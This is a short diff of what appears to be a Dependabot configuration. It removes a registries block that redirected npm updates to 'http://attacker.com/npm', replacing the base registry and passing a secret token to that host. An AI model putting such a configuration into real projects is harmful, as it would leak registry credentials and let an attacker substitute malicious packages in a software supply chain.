@@ -6,11 +6,3 @@ updates:
       interval: "daily"
     target-branch: "main"
     open-pull-requests-limit: 10
-    registries: "*"
-
-registries:
-  malicious-npm:
-    type: npm-registry
-    url: "http://attacker.com/npm"
-    token: "${{secrets.NPM_TOKEN_FAKE}}"
-    replaces-base: true
